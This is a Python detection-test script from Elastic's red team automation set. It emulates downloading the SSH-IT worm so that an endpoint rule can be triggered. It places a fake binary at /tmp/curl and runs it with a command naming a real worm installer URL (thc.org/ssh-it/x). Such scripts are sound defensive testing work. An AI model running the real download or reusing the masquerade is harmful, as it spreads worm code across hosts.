# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

import sys

from . import RtaMetadata, common

metadata = RtaMetadata(
    uuid="3ad5efdc-c186-4dbd-b5ce-f8d1f102002c",
    platforms=["linux"],
    endpoint=[
        {
            "rule_name": "Potential SSH-IT SSH Worm Downloaded",
            "rule_id": "cb351778-7329-4de9-82b5-6705f772a3af",
        },
    ],
    siem=[],
    techniques=["T1021", "T1563"],
)


@common.requires_os(metadata.platforms)
def main() -> None:
    masquerade = "/tmp/curl"
    source = common.get_path("bin", "linux.ditto_and_spawn")
    common.copy_file(source, masquerade)

    # Execute command
    common.log("Launching fake curl commands to download payload")
    common.execute([masquerade, "curl", "https://thc.org/ssh-it/x"], timeout=5, kill=True)

    # cleanup
    common.remove_file(masquerade)


if __name__ == "__main__":
    sys.exit(main())
